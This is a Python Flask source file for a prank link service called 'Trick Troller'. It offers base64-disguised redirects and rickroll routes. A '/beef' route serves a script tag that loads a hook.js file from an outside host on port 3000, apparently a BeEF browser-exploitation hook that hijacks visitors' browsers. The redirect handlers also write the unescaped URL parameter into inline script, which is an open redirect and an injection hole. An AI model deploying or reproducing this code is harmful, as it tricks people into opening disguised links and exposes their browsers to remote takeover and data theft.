from flask import Flask, render_template, request
from base64 import b64decode, b64encode

def decode(encoding, txt):
	encoding = encoding.lower()
	print(txt)
	if encoding == 'b64' or encoding == '64' or encoding == 'base64':
		url = b64decode(txt).decode('utf-8')
		if url[:8] != 'https://' and url[:7] != 'http://':
			url = 'https://'+url
		return url


app = Flask('Trick Troller')


@app.route('/redirect')
@app.route('/goto')
def redirect():
	url = request.args.get('url')
	encoding = request.args.get('enc')
	if url != None:
		if encoding == None:
			if url[:8] != 'https://' and url[:7] != 'http://':
				url = 'https://'+url
			return f'<script>document.location = "{url}"</script>'
		else:
			return f'<script>document.location = "{decode(encoding, url)}"</script>'


@app.route('/')
def home():
	return render_template('home.html')


@app.route('/rick')
@app.route('/rick<wildcard>')
@app.route('/rick/<wildcard>')
@app.route('/rick/<wildcard>/<subwildcard>')
def rick_roll(wildcard=None, subwildcard=None):
	return '<script src="/static/rickroll.js"></script>'


@app.route('/library')
@app.route('/library<wildcard>')
@app.route('/library/<wildcard>')
@app.route('/library/<wildcard>/<subwildcard>')
def babel_rickroll(wildcard=None, subwildcard=None):
	return '<script src="/static/babel.js"></script>'


@app.route('/beef')
@app.route('/beef<wildcard>')
@app.route('/beef/<wildcard>')
@app.route('/beef/<wildcard>/<subwildcard>')
def beef(wildcard=None, subwildcard=None):
	return '<script src="https://brightkali.me:3000/hook.js"></script>'


@app.route('/api')
def api():
	txt = request.args.get('txt')
	func = request.args.get('func')
	if txt != None and func != None:
		if func == '64' or func == 'Base64':
			txt = b64encode(bytes(txt, 'utf-8')).decode('utf-8')
		elif func == 'd64':
			txt = b64decode(bytes(txt, 'utf-8')).decode('utf-8')
	else:
		txt = 'That didn\'t work :/'

	return render_template('result.html', url=f'https://redirect.brightshard.dev/goto?url={ txt }&enc={ func }')


app.run('0.0.0.0', 80)
